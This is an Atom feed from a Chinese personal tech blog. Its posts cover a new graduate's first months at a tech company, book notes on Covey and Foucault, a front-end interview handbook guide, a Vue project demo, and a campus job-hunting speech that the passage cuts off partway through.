<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>浅笔墨画</title>
  
  <subtitle>github @okaychen</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.chenqaq.com/"/>
  <updated>2021-02-07T11:20:09.845Z</updated>
  <id>https://www.chenqaq.com/</id>
  
  <author>
    <name>okaychen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>愿你熬得过万丈孤独，藏的下星辰大海</title>
    <link href="https://www.chenqaq.com/2021/02/07/life-aboutLife20210207/"/>
    <id>https://www.chenqaq.com/2021/02/07/life-aboutLife20210207/</id>
    <published>2021-02-07T15:28:48.000Z</published>
    <updated>2021-02-07T11:20:09.845Z</updated>
    
    <content type="html"><![CDATA[<p>严峻疫情下，岁月静好，不忘星光赶路人。被按下暂停键的20年，在武汉时隔76天后被重启，”匆匆”成了毕业季的代名词。6月没有毕业典礼的仪式我们匆匆毕业，匆匆的行程来到帝都。</p><p>20年上半年完成了一份应届生可能遇到的前端面试题小册子，完整90页PDF前前后后也历时近2个月，最初发在GitHub和牛客网，后来运营牛妹希望可以支持他们牛客网的小册子，就这样发了第一版，很享受那段坚持思考码字的时光，是充实亦满足的。因为小册子的补充，鉴于老妈腿的恢复程度，加上疫情，没有选择度厂实习，6月28号匆匆的行程搭上了从郑州-北京的旅程，行程安排之后醒悟过来那天正是跨过旧一岁的日子，好在一切都还是顺利的，租房的第二个就看到满意的结果，顺利签订了合同入住。本来安排7月1号入职，因为和毕业证时间是同一天，主动推迟了一周。7月8号，顺利完成了入职流程，吃到了度厂的食堂，坐标科技园K5。</p><div class="justified-gallery"><p><img alt="小屋子" data-src="https://www.chenqaq.com/assets/2021/2021_02_07_002.jpeg" class="lazyload"><br><img alt="好奇夜盲盒" data-src="https://www.chenqaq.com/assets/2021/2021_02_07_003.jpeg" class="lazyload"></p>          </div><p>科技园最初建于2014年，最初只有k1，听前辈们说”k1天桥最初只搭了一半，后来看着一栋一栋建起来”，灵感来源于象征无穷大的∞以及莫比乌斯环，面试的时候是在大厦，所以那天应该是我第一次来科技园。因为航天城的缘故，经常会看到远高处呼啸而过，这里的建筑被要求应该只有7层左右的样子，但整体设计灵感以及内饰环境都非常nice。</p><div class="justified-gallery"><p><img alt="我的工位" data-src="https://www.chenqaq.com/assets/2021/2021_02_07_001.jpeg" class="lazyload"></p>          </div><p>目前在手白FEED FE团队跟用户增长方向，致力于为手白及其矩阵产品贡献DAU和新增。本职技术及业务之外，尝试学习了产品常用的增长打法，增长的技术手段，这要感谢我们产品的无私分享，互相支持，入职以来我们相处的很和谐。下一阶段会读《增长黑客》《硅谷增长黑客实战笔记》这两本书，虽然和前端并不是强相关，我觉得还是很有意义的。入职以来，我的整体感受度厂对应届生，还是非常友好的，从leader到one o one的mentor制到团队，无论是从生活还是研发问题，甚至职业规划，都能帮你提出一些建设性的意见。我发现我的一些额外技能会疯狂去嗨去biu，也会在新年第一天加班支持工作，在去吃海底捞的车上连热点查case，研发同样是一个值得尊敬的职业，感恩敬业的前辈们。</p><p>从七月到现在，虽然时间还不长，但同样见证了度厂的从低谷到飙升的股价，见证了最近发生在身边一些很温暖的产品。CNNIC公布了截止到20年12月，中国的网民数量达到了9.89亿，其中使用过健康码的达9亿；2020年3月到6月，全国老年人网民数量激增，累计至2.14亿。响应国家号召手白大字版的上线，定制语音包让你的爸妈可以用你的声音去听新闻。至少我现在还相信度厂的市值是被低估的，作为老牌互联网公司，她的技术和流量资源是可观的，只是面对存量时代下获客成本与日俱增，外界流量的闭环，未探索到新的利润激增点，但她同样是一个业务上不断努力改错去满足用户情感的企业。前段时间赵英俊留下的最后一篇小作文”这是他留给这个世界最后一篇小作文”，头条号很细节的把这篇文章的点赞按钮换成了小蜡烛，可能只是一个小icon，技术上的实现是有限的，但实现之后被用户发觉表达的情感确是无限扩散的。你可以坚信情感的表达是技术的最终实现。</p><p>一直以来很钦佩能每天运营自己原创文章公众号的前辈，是我一直以来的想法，甚至对公众号进行了多次修改，也没有寻找到自己最想要的样子。写一篇原创文章的时间成本是巨额的，从知识贮备，整体构思，到资料收集，语言组织咬文嚼字都需要反复思考。2021愿不在等待，那怕从无到有，归零开始。你曾享受独处的时光，愿你熬得过万丈孤独，藏的下星辰大海。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;严峻疫情下，岁月静好，不忘星光赶路人。被按下暂停键的20年，在武汉时隔76天后被重启，”匆匆”成了毕业季的代名词。6月没有毕业典礼的仪式我们匆匆毕业，匆匆的行程来到帝都。&lt;/p&gt;
&lt;p&gt;20年上半年完成了一份应届生可能遇到的前端面试题小册子，完整90页PDF前前后后也历时近
      
    
    </summary>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/categories/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/tags/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>Big Hairy Audacious Goals</title>
    <link href="https://www.chenqaq.com/2020/12/31/reading-notes001/"/>
    <id>https://www.chenqaq.com/2020/12/31/reading-notes001/</id>
    <published>2020-12-31T03:54:00.000Z</published>
    <updated>2021-01-27T15:11:55.548Z</updated>
    
    <content type="html"><![CDATA[<p>BHAG理念的追求：Big Hairy Audacious Goals，宏伟的、冒险的、大胆的目标</p><p>在巨变之中，保持独立思考，对人性的释放，自由的文明本质追求，弥足珍贵</p><a id="more"></a><h1 id="高效能人士的七个习惯"><a href="#高效能人士的七个习惯" class="headerlink" title="高效能人士的七个习惯"></a>高效能人士的七个习惯</h1><p>1、2018年5月-30周年纪念版<br>2、史蒂芬·柯维先生于12年7月去世，他的一句经典的口头禅是”品味生活的精华”<br>3、逝者安息!史蒂芬·柯维的事业仍将继续，史蒂芬·柯维的精神将永存，像这本书刚出版时一样的鲜活<br>4、坚持核心，刺进进步，是成就伟大公司和个人的其中一个关键<br>5、BHAG理念的追求：Big Hairy Audacious Goals，宏伟的、冒险的、大胆的目标<br>6、柯维体系的中心原则：首先塑造性格，先战胜自己才能赢得工作上的胜利<br>–––7～11 2004版前言 柯维 作–––<br>7、变化的世界，不变的原则<br>8、努力工作是远远不够的，因为在市场和技术全球化的驱动下，竞争日趋白热化，技术领域发展之快，令人目眩，所以我们不能满足于校园教育，要不断接受继续教育和重塑自我，我们必须训练头脑，大量投入，不断磨练，提升自己的竞争力，以免被社会淘汰。<br>9、我们无法忽视平衡的原则，一方面，我们要满足今天的需要，另一方面，我们要进行投资提升竞争力，以取得将来的持久成功。<br>10、如果一个人足够谦逊以至于能够接受并负起对周遭环境的责任，足够有勇气去付出创造性的努力来战胜或避开困难，你将从他身上看到不同应对方式的巨大能量。<br>11、大多数人的情绪易受他人左右，无法专注的聆听––他们无法在说出自己的想法前，先把自己的事情搁置一旁，倾尽全力来理解对方的想法<br>习惯一：积极主动<br>习惯二：以始为终<br>习惯三：要事第一<br>习惯四：双赢思维<br>习惯五：知彼解己<br>习惯六：综合综效<br>习惯七：不断更新<br>12、条件作用对人类认知和思维方式的巨大影响<br>13、人们越是依赖立竿见影的解决办法，越是加剧了问题潜在的隐患。<br>14、这本书强调新的思想水平，它强调以原则为中心，以品德为基础，要求”由内而外”的实现个人效能和人际效能。<br>15、习惯对我们的生活有着极大的影响，因为它是一贯的，在不知不觉中，经年累月影响着我们的品德，暴露出我们的本性，左右着我们的成败。<br>16、成熟模式图：即人类的三个阶段，分别为依赖期，独立期，互赖期<br>17、人类所拥有的资本，基本上可以分为物资资产，金融资本以及人力资本三大类<br>18、符合自然法则的思维方式为基础，柯维称这个自然法则是 产出/产能平衡(P/B balance)，效能在于产出与产能的平衡，P代表希望获得的产出，即金蛋；PC代表产能，即生产金蛋的资产或能力。<br>19、最令人鼓舞的事实，莫过于人类确实能主动努力以提升生命价值 –&gt; 梭罗<br>20、人类特有的精神活动，即思考自己的思维过程的能力。<br>21、用来解释人性的三种决定论：基因决定论，心理决定论，环境决定论，这三种都以刺激-&gt;回应理论为基础。<br>22、我们都受条件左右，以某一特定方式回应某一特定刺激-&gt;巴甫洛夫<br>23、在最恶劣的环境中，弗兰克尔运用人类独有的自我意识，发掘了人性最根本的原则，即在刺激与回应之间，人有选择的自由<br>24、弗兰克尔曾指出人生有三种主要的价值观，一是经验价值观，来自自身经历；二是创造价值观，源于个人独创；三是态度价值观，即面临困境时的回应。<br>25、积极主动的语言，消极被动的语言。<br>26、关注圈，影响圈。积极主动的人专注于“影响圈”，他们专心做自己力所能及的事，他们的能量是积极的，能够使影响圈不断扩大。<br>27、阅读下面的内容时，请找个僻静的角落，抛开一切杂念，敞开心扉，跟着我走过这段心灵之旅<br>28、帕累托原则，以20%的活动取得80%的成功</p><h1 id="疯癫与文明"><a href="#疯癫与文明" class="headerlink" title="疯癫与文明"></a>疯癫与文明</h1><p>“我们却不得不撰写一部有关另一种形式的疯癫的历史，因为人们出于这种疯癫，用一种至高无上的理性所支配的行动把自己的邻人禁闭起来，用一种非疯癫的冷酷语言相互交流和相互承认”。这本书是米歇尔福柯的代表作，通过研究西方世界的疯癫史，探寻人类文明社会的发展脉络。</p><p>人类的起点初期，疯癫和理性并没有断裂和对立，但人类文明的发展，逐渐成为理性对非理性（疯癫，犯罪和痴呆）的征服和控制，文明即是一种统治非理性的权力，理性和非理性之间不再平等，也不会再有交流和对话。福柯正是用知识考古学的方法，从一堆文学，剧本和艺术资料中，去挖掘疯癫以及对付疯癫的历史，从而揭示人类文明的真正秘密。</p><p>福柯将人类的疯癫史分为三个阶段:</p><p>第一个阶段为中世纪末（麻风病结束）到文艺复兴时期，此时的人类对疯癫认识是模糊的，疯癫的体验被多重意义所笼罩：人类原始堕落和上帝意志的堕落，兽性及其各种变形，以及知识中的一切神奇秘密。人类只是发明了愚人船，将这些人放逐，让他们从一个城镇到另一个城镇。此时疯癫还未被完全分隔，人类对待疯癫还是非常友善的。</p><p>第二阶段是古典阶段，此时开始建立总医院，用于禁闭“精神错乱者”，此时的疯癫被认为是贫困，没有工作能力和没有和社会融合的能力，疯癫者被当作社会垃圾一样被清扫和集中在感化院。从此疯癫便听命于理性，受制于道德戒律，在慢慢黑夜中度日。在古典时期，疯癫被认为是人类长期受到压制的兽性的暴露，它甚至用来和动物一样被展览。而对于疯癫的解释，疯癫者被认为生活在幻想之中，疯癫是一种虚无状态。</p><p>第三阶段，随着医学和精神分析学的发展，人类开始真正认识到疯癫的真正原因，疯癫从此和宗教，道德和伦理联系在一起，穷人和罪犯不再被视为疯癫，疯癫者从此被视为了一种未成年的状态，需要在”家长”的帮助下，回归到理性的状态。疯癫者的精神需要被改造到符合社会的要求，疯癫者从此彻底失去自己的话语，服从理性和秩序，从而形成了整齐划一的社会规范。</p><p>通过对疯癫历史的研究，寻出人类文明的发展逻辑，理性与非理性从统一逐渐走向断裂，最后走向了彻底对立，最终理性实现了对非理性的统治。</p><p>但疯癫作为人类发展中不断出现的现象，却不可能因此彻底的消失。它在艺术的领域找到了繁殖和复制的土壤，他打断了世界的时间，而艺术便显示了一个虚空，一个沉默的片刻以及没有答案的问题，它造成了一个不可弥合的缺口，迫使世界对自己提出质疑。人类文明正是在吞没艺术作品的疯癫中不断获得新的空间。</p><p>福柯最后写到”世界本身任何的东西，尤其是它对疯癫的认识，不能使世界确信它可以用这类疯癫的作品来证明自身的合理性”。对于非理性的认识，理性永远无法完成和抵达。在巨变之中，保持独立思考，对人性的释放，自由的文明本质追求，弥足珍贵。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BHAG理念的追求：Big Hairy Audacious Goals，宏伟的、冒险的、大胆的目标&lt;/p&gt;
&lt;p&gt;在巨变之中，保持独立思考，对人性的释放，自由的文明本质追求，弥足珍贵&lt;/p&gt;
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://www.chenqaq.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="https://www.chenqaq.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>我的动态</title>
    <link href="https://www.chenqaq.com/2020/07/30/attention/"/>
    <id>https://www.chenqaq.com/2020/07/30/attention/</id>
    <published>2020-07-29T16:00:00.000Z</published>
    <updated>2021-02-07T11:02:40.091Z</updated>
    
    <content type="html"><![CDATA[<div class="note success">            <p>2021年02月：静态资源日益增多，升级抽离静态资源JSDelivr cdn + gitHub管理<br>—- ❤️ —- <a href="https://github.com/okaychen/CDN" target="_blank" rel="noopener">cdn管理地址</a></p>          </div> <div class="note success">            <p>2020年02月～03月：应牛客网运营牛妹推荐，完成的一份90页pdf校招前端面试小册子<br>—- 🌟 —-  <a href="https://github.com/okaychen/FE-Interview-Brochure" target="_blank" rel="noopener">面试总结小册</a> ｜ <a href="https://docs.chenqaq.com/" target="_blank" rel="noopener">相应托管页</a></p>          </div> <div class="note success">            <p>2019年11月14~15日：<a href="https://www.cnblogs.com/okaychen/" target="_blank" rel="noopener">博客园</a>博文迁移完成，博客整改，新增友链和Valine评论</p>          </div> <div class="note success">            <p>2017年12月5日：为了方便管理和发文基于hexo搭建本站托管在github，初衷只是个人写作和技术生活的学习记录</p>          </div> <a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;div class=&quot;note success&quot;&gt;
            &lt;p&gt;2021年02月：静态资源日益增多，升级抽离静态资源JSDelivr cdn + gitHub管理&lt;br&gt;—- ❤️ —- &lt;a href=&quot;https://github.com/okaychen/CDN&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;cdn管理地址&lt;/a&gt;&lt;/p&gt;
          &lt;/div&gt; 
&lt;div class=&quot;note success&quot;&gt;
            &lt;p&gt;2020年02月～03月：应牛客网运营牛妹推荐，完成的一份90页pdf校招前端面试小册子&lt;br&gt;—- 🌟 —-  &lt;a href=&quot;https://github.com/okaychen/FE-Interview-Brochure&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;面试总结小册&lt;/a&gt; ｜ &lt;a href=&quot;https://docs.chenqaq.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;相应托管页&lt;/a&gt;&lt;/p&gt;
          &lt;/div&gt; 
&lt;div class=&quot;note success&quot;&gt;
            &lt;p&gt;2019年11月14~15日：&lt;a href=&quot;https://www.cnblogs.com/okaychen/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;博客园&lt;/a&gt;博文迁移完成，博客整改，新增友链和Valine评论&lt;/p&gt;
          &lt;/div&gt; 
&lt;div class=&quot;note success&quot;&gt;
            &lt;p&gt;2017年12月5日：为了方便管理和发文基于hexo搭建本站托管在github，初衷只是个人写作和技术生活的学习记录&lt;/p&gt;
          &lt;/div&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>前端面试小册-导读</title>
    <link href="https://www.chenqaq.com/2020/01/02/interview-brochure-guide/"/>
    <id>https://www.chenqaq.com/2020/01/02/interview-brochure-guide/</id>
    <published>2020-01-02T04:40:40.000Z</published>
    <updated>2020-09-21T13:08:34.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h1><p>互联网发展迅猛之余也伴随着互联网寒冬，行业不景气这样的词，等毕业季去各个求职网站投简历，去各个人才市场找机会，才发现四处碰壁，作为应届求职者更需要打好基础，明确发展规划，跟上行业步伐。下面是本人2019年秋招前端面试经历，结合个人博客和牛油们面经中的高频问题以及行业前辈们复习资料的综合整理，包含基础篇、Vue框架篇、HTTP&amp;浏览器、构建工具篇、安全篇、算法篇，欢迎交流斧正。希望大家在毕业季都能一帆风顺，从容斩获OFFER</p><h1 id="计划-amp-状态"><a href="#计划-amp-状态" class="headerlink" title="计划&amp;状态"></a>计划&amp;状态</h1><p>🤤 主要面向对象：应届生求职–前端</p><table><thead><tr><th align="center">篇章</th><th align="center">第一版预计完成</th><th align="center">状态</th></tr></thead><tbody><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Questions/blob/master/html-and-css.md" target="_blank" rel="noopener">HTML&amp;CSS</a></td><td align="center">Q20</td><td align="center">😀 已完善</td></tr><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Questions/blob/master/javascript.md" target="_blank" rel="noopener">JavaScript</a></td><td align="center">Q25</td><td align="center">😀 已完善</td></tr><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Questions/blob/master/http.md" target="_blank" rel="noopener">HTTP&amp;浏览器</a></td><td align="center">Q20</td><td align="center">😂 已完善</td></tr><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Brochure/blob/master/vue.md" target="_blank" rel="noopener">Vue篇</a></td><td align="center">Q15</td><td align="center">🤔 已完善</td></tr><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Brochure/blob/master/algorithm.md" target="_blank" rel="noopener">算法篇</a></td><td align="center">Q10</td><td align="center">🤔 已完善</td></tr><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Brochure/blob/master/security.md" target="_blank" rel="noopener">安全篇</a></td><td align="center">Q5-10</td><td align="center">🤔 已完善</td></tr><tr><td align="center"><a href="https://github.com/okaychen/FE-Interview-Brochure/blob/master/webpack.md" target="_blank" rel="noopener">构建工具篇</a></td><td align="center">Q5-10</td><td align="center">🤔 已完善</td></tr></tbody></table><blockquote><p>Vue篇以Vue为主的一些框架问题，后面会考虑加上React</p><p>构建工具篇以前端工作流中的webpack为核心</p><p>面试官一般都会根据回答进行追问，所以小册总结上下几个问题一般具有连贯性</p><p>其次也正是因为是面试小册，有些问题只是总结出较核心概念，比如浏览器解析渲染页面的过程，其实是一个很细的过程，其中滋味还需花时间细品；另外我也有意愿学习并再次总结这些问题，小册结束之后我会开始这个计划；</p></blockquote><h1 id="使用姿势"><a href="#使用姿势" class="headerlink" title="使用姿势"></a>使用姿势</h1><h2 id="Gitbook："><a href="#Gitbook：" class="headerlink" title="Gitbook："></a>Gitbook：</h2><p>Gitbook：<a href="https://docs.chenqaq.com/" target="_blank" rel="noopener">docs.chenqaq.com</a></p><p><img alt="img" data-src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Lw7LsePj3e23XxNTaOL%2F-LxFaiAEGtIYHqghgzY-%2F-LxFapLtBjjQtFRYAza4%2Fimage.png?alt=media&token=edcec005-b2a3-4851-968a-0809754a18b5" class="lazyload"></p><blockquote><p>那你说Gitbook国内访问比较慢我也不能科学上网，我是不是不适合学前端 🤣 这两好像没一点关系，我来帮你解决 👇</p></blockquote><h2 id="Github：‌"><a href="#Github：‌" class="headerlink" title="Github：‌"></a>Github：‌</h2><p>Github阅读：<a href="https://github.com/okaychen/FE-Interview-Brochure" target="_blank" rel="noopener">https://github.com/okaychen/FE-Interview-Brochure</a></p><p>那你说我觉得你这点总结的不对或者有更好的建议，该咋办，很简单，你给我发个issue，我会第一时间跟进</p><p>那我想下载到本地呢，打开你的git bash：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">- git <span class="keyword">clone</span> <span class="title">https</span>://github.com/okaychen/FE-Interview-Brochure.git</span><br></pre></td></tr></table></figure><p>敲个回车这么简单（这里推荐一个markdown编辑器Typora）</p><blockquote><p>那你说git我也没有装呀，我太难了，我是不是不适合学前端🤣建议还是装个..</p><p>那你又说我就不想装，好，有个性我喜欢，你遇到了我，我帮你解决👇</p></blockquote><h2 id="PDF："><a href="#PDF：" class="headerlink" title="PDF："></a>PDF：</h2><p>为了让有个性的同学也看到这份前端面试小册，我推出了方案C‌</p><p>我已经发布了release版本：<a href="https://github.com/okaychen/FE-Interview-Questions/releases/download/v0.0.1/FE-Interview-Brochure_0.0.1.pdf" target="_blank" rel="noopener">点击直接下载PDF</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;导读&quot;&gt;&lt;a href=&quot;#导读&quot; class=&quot;headerlink&quot; title=&quot;导读&quot;&gt;&lt;/a&gt;导读&lt;/h1&gt;&lt;p&gt;互联网发展迅猛之余也伴随着互联网寒冬，行业不景气这样的词，等毕业季去各个求职网站投简历，去各个人才市场找机会，才发现四处碰壁，作为应届求职者
      
    
    </summary>
    
    
      <category term="面试手册" scheme="https://www.chenqaq.com/categories/%E9%9D%A2%E8%AF%95%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="面试手册" scheme="https://www.chenqaq.com/tags/%E9%9D%A2%E8%AF%95%E6%89%8B%E5%86%8C/"/>
    
  </entry>
  
  <entry>
    <title>完整启动vue全家桶项目</title>
    <link href="https://www.chenqaq.com/2019/12/11/vue-HowToLaunchAVueFamilyBarrel/"/>
    <id>https://www.chenqaq.com/2019/12/11/vue-HowToLaunchAVueFamilyBarrel/</id>
    <published>2019-12-11T11:55:17.000Z</published>
    <updated>2020-07-23T04:13:38.773Z</updated>
    
    <content type="html"><![CDATA[<p>完整启动一个vue全家桶项目，前端为<code>element-ui+vue-router+vue-resource+vuex+vue-cli脚手架+webpack构建工具</code>，后台为<code>express</code>，数据库使用<code>mongodb</code>，数据库可视化工具使用<code>robo3t</code>，系统是<code>linux</code></p><ul><li><p>前端：<a href="https://github.com/okaychen/manageSys" target="_blank" rel="noopener">manageSys</a></p></li><li><p>后台：<a href="https://github.com/okaychen/manageSys-backend" target="_blank" rel="noopener">manageSys-backend</a></p></li></ul><a id="more"></a><p><video src="https://cdn.jsdelivr.net/gh/okaychen/CDN@1.4/BlogSource/videos/vueFanily-2019-12-11_20.38.03.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" muted width="100%" min-height="100%">embed: xss–chrome_test</video></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;完整启动一个vue全家桶项目，前端为&lt;code&gt;element-ui+vue-router+vue-resource+vuex+vue-cli脚手架+webpack构建工具&lt;/code&gt;，后台为&lt;code&gt;express&lt;/code&gt;，数据库使用&lt;code&gt;mongodb&lt;/code&gt;，数据库可视化工具使用&lt;code&gt;robo3t&lt;/code&gt;，系统是&lt;code&gt;linux&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;前端：&lt;a href=&quot;https://github.com/okaychen/manageSys&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;manageSys&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;后台：&lt;a href=&quot;https://github.com/okaychen/manageSys-backend&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;manageSys-backend&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Node" scheme="https://www.chenqaq.com/categories/Node/"/>
    
      <category term="Vue" scheme="https://www.chenqaq.com/categories/Vue/"/>
    
      <category term="mongodb" scheme="https://www.chenqaq.com/categories/mongodb/"/>
    
    
      <category term="Node" scheme="https://www.chenqaq.com/tags/Node/"/>
    
      <category term="Vue" scheme="https://www.chenqaq.com/tags/Vue/"/>
    
      <category term="mongodb" scheme="https://www.chenqaq.com/tags/mongodb/"/>
    
      <category term="express" scheme="https://www.chenqaq.com/tags/express/"/>
    
      <category term="linux" scheme="https://www.chenqaq.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>20191124演讲稿备份</title>
    <link href="https://www.chenqaq.com/2019/11/22/life-speech20191124/"/>
    <id>https://www.chenqaq.com/2019/11/22/life-speech20191124/</id>
    <published>2019-11-22T14:31:01.000Z</published>
    <updated>2020-07-23T04:13:38.772Z</updated>
    
    <content type="html"><![CDATA[<p>很荣幸今天能和大家在这里有一个交流会，我是计算机学院信管专业一名普通的大四学生，也是行思工作室的一员，时光就像这个秋天一样很短，记忆中仿佛就在昨天，那个背着双肩包怀着对大学憧憬和向往的男孩，转身间却已经成为了学校最年长的一届本科生</p><a id="more"></a><p>大学是什么? <code>大学要尽早设立目标，在相对自由的氛围里找到自己真正的热爱的东西</code><br>（聊天：大家上初中高中的时候，有没有听过一句最动人的”鸡汤”：”上了大学就轻松了”），寒窗苦读考上了大学，几年前那个为大学而努力的自己，现如今却已成为这个多彩生活的一份子，会有充分自己可以安排的时间，有参加不完的活动上不完的课，更会有打不完的游戏和追不完的剧，就是这样的大学生活却对每一同学有着举足轻重的影响，毕业季面临的压力接踵而至：我该去”考研””考公务员”又或者我是否有能力去”就业”，（聊天：现在大家做一个选择，然后问自己为什么？）我们不经意间都在进行选择，但是很多时候不少同学却没有想清楚自己为什么要这样选，只是到最后班上30个同学25个都去考研了，那我也去考研吧！考研本身没有错，错的是从小到大接受的观念让我们一直在沿着多数人的轨迹去走，从来没有对人生有一个清晰的规划，我们应该了解清楚自己内心真正喜欢什么，自己兴趣在哪个方面，自己性格适合去做什么，建立自己的人生观和价值观，”大学要尽早设立目标，在相对自由的氛围里找到自己真正热爱的东西”。与此同时，我们在经历一个从被动学习到主动学习的转变，学习方法也截然不同，我们应该尽快适应这个转变，找到适合自己的学习方法，适应大学的学习节奏。</p><p>考研or就业? <code>跳出舒适圈，开阔眼界和见识，增加人生阅历，提高自身综合素质</code><br>“想清楚了，那还等什么等？前途风景正好，追风赶月莫停留！”既然想清楚了自己为什么要考研或者就业，要提前了解和准备，如果想读研的话，能不能靠自己三年的努力去争取一个保研的名额，怎么才能保研？保研应该注意哪些问题？为了保研应该保证GPA到多少，综合排名能不能在专业名列前茅？同样考研应该提前做哪些准备，很敬佩那些为了保研考研而努力的每一位同学，也从没有低看过自己和同类的伙伴，至少在前端这件事上我一直保持有严谨追求极致向往敏捷的态度，三年为保研考研或者三年成为企业所需要的就业人才，我们都同样用尽自己的大学三年，换了大学毕业季一个满意的答卷。</p><p>（因为重点是就业指导，所以我就把重心放在就业方面）首先要清楚的一个事实是，我们学校的宣讲会招聘小众化，很可能都没有自己想做的岗位，如果你想进军互联网，那你很幸运，根本没有。截止到2019年6月15日，教育部公布大学数量一共有2956所，你所知道的企业他们不会来我们学校开宣讲会招聘互联网岗位的人才，但不得不承认，我们学校确实有一小波这样的互联网就业储备人才，那我们就这样甘心灭绝或者再去争取一个你期待的某个企业会去某个学校开宣讲会的研究生嘛？我觉得大学还是研究生都当以”跳出舒适圈，开阔眼界和见识，增加人生阅历，提高自身综合素质”为标准，虽然名校传也有某些企业以此作为选人标准，但是请你相信这只是他们选人的其中一条，并不是重点的核心，企业一定需要的是能给公司带来收益的人才，看重的是专业知识度和发展潜力，而不是研究生这个标签，所以要正视就业正视考研。</p><p>如果你想要就业，该做哪些准备？下面我写的纯干货，我相信无论本科还是研究生就业都需要了解</p><ul><li>找到一个热爱并且可以支撑自己兴趣爱好的事业，并以此为基准</li><li>提高自身专业知识度和综合素质，增加人生阅历</li><li>去了解一个企业或者一个岗位JD，作为自己的发展目标</li><li>用自己的大学或者研究生为自己准备一份简历<ul><li>简历需要什么不需要什么：<ul><li>简历是一份一页或者两页pdf，请放弃word,h5等，尽量简介大方，放弃色彩搭配黑白最佳，简洁但是要满，不要稀稀拉拉的，如果是设计岗的同学，请上传现有作品的附件或者链接</li><li>HR需要的是一份一眼就能知道你跟这个岗位很吻合的简历</li><li>和岗位的无关的内容一概不要写，尤其不要写自己的生活兴趣爱好等，喜欢运动音乐弹个吉他什么的一类无关紧要的话，hr真的没有时间细看，不小心瞟到了会显得在凑字数</li><li>不要造假，不要造假，不要造假，重要的事情说三遍，一旦被证实耽误的真的是你一辈子的就业前途，会被企业永久拉进黑名单，请正视这个问题，现在时间还早，不如多花时间提高，为自己准备一份合格的简历</li><li>和岗位JD有关的关键词，多写认真写，在项目中清楚体现</li><li>项目经历结构化，按照STAR原则去写</li></ul></li></ul></li><li>跳出舒适圈，走出学校去一个企业实习<ul><li>去争取一份工作，平时应该着重培养哪些：<ul><li>如果应聘技术类的岗位：一定要写点什么，把代码量搞上去，自己发在github上面，有自己代表性的项目，如果刚好你喜欢写作，喜欢经营自己的技术博客那么恭喜你，你会是一个幸运儿，无论你从事什么行业，写作能力真的会伴随你一生</li><li>如果你想要应聘职能类（运营，市场，销售之类）的岗位：自己要做点什么，比如自己运营一个微信号，自己发个软文，多学习，要做出点像样的成绩来</li></ul></li></ul></li><li>抓住招聘季，春季招聘金三银四，秋季招聘金九银十<ul><li>分清春季和秋季招聘的区别：<ul><li>春季招聘多数是招聘本年度暑期实习生，少数是对去年秋季招聘的补招</li><li>大三暑假的秋季招聘7月开始是毕业季招聘的核心，是为公司储备应届毕业人才</li></ul></li><li>分清暑期实习和日常实习的区别：<ul><li>暑期实习是为秋季招聘的预备人才，一般三个月以上，需要答辩成功后会有直接转正机会</li><li>日常实习也需要到岗实习，实习时间自由一般一周4-5天，看部门缺口很少有转正机会</li></ul></li><li>投递途径：<ul><li>内推＆网申</li><li>宣讲会＆网申</li><li>正视内推<ul><li>内推只是简历投递的一种途径，你的师兄师姐在你想投递的公司可以帮你内推，也可能直接帮你把简历给部门经理，但是免不免笔试，面试结果如何他还没办法左右</li></ul></li><li>宣讲会：企业会预先安排自己的宣讲会行程，会在哪些学校进行，一般在９月进行，是介绍企业文化，人才培养计划等路演形式，分为一站式和非一站式，一站式现场收简历并且笔试，通过后一般在接下来2-3内在该学校附近就行面试，非一站式可能现场收简历，但是不会笔试面试</li></ul></li><li>招聘流程：<ul><li>提前批＆正式批＆补招<ul><li>提前批是在正式批次的预热，简历一般要求较高，学历，经验，能力，如果提前批你已经应聘上了心仪的公司，恭喜你，你的毕业招聘季在9月份就已经正式结束，也就是大四开学的那段时间</li><li>正式批一般是网申批次，走正常招聘流程，不免笔试</li><li>补招是企业对秋季招聘人才缺口的补充，在正式批结束后一段时间进行，一般在11月后</li></ul></li><li>笔试（